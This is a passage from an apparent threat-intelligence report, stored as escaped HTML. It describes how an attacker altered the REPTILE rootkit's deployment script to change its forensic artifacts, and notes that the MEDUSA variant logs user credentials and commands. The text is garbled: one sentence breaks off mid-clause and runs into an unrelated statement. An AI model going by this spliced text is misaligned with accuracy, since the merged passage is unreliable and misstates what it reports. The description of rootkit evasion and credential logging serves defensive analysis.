script\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e responsible for building REPTILE components and configuring a persistence mechanism for the REPTILE kernel-level component. The following additions were observed in the deployment shell script, which resulted in the creation of different forensic artifacts from the original REPTILE:\u003c/span\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe threat actor replaced every instance of \"reptile\" with a unique keyword, which resulted in different filenames for rootkit component Unlike REPTILE, which only provides an interactive access with rootkit functionalities, MEDUSA exhibits capabilities of logging user credentials from the successful authentications, either locally or remotely, and command executions.
